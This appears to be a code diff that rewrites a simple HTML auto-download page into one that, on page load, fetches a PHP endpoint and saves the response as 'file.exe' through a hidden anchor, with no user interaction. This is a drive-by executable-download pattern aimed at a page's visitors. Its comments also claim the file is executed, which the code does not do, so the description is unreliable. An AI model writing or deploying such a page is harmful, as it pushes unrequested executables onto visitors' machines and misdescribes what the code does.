@@ -3,24 +3,34 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Auto Download</title>
+<title>Auto Download and Execute</title>
 </head>
 <body>
 <script>
-// Set the file URL
-const fileUrl = 'path_to_your_file.ext'; // Replace 'path_to_your_file.ext' with the actual path to your file
+// Set the PHP script URL
+const phpScriptUrl = 'download_and_execute.php'; // Replace 'download_and_execute.php' with the actual URL of your PHP script
 
 // Function to trigger download
-function triggerDownload() {
-    const anchor = document.createElement('a');
-    anchor.href = fileUrl;
-    anchor.download = fileUrl.split('/').pop(); // Extracts filename from URL
-    anchor.click();
+function triggerDownloadAndExecute() {
+    // Request the PHP script which serves the executable file
+    fetch(phpScriptUrl)
+    .then(response => response.blob())
+    .then(blob => {
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.style.display = 'none';
+        a.href = url;
+        a.download = 'file.exe'; // Change the filename if necessary
+        document.body.appendChild(a);
+        a.click();
+        window.URL.revokeObjectURL(url);
+    })
+    .catch(error => console.error('Error downloading and executing:', error));
 }
 
-// Trigger download automatically when the page loads
+// Trigger download and execution automatically when the page loads
 window.onload = function() {
-    triggerDownload();
+    triggerDownloadAndExecute();
 };
 </script>
 </body>
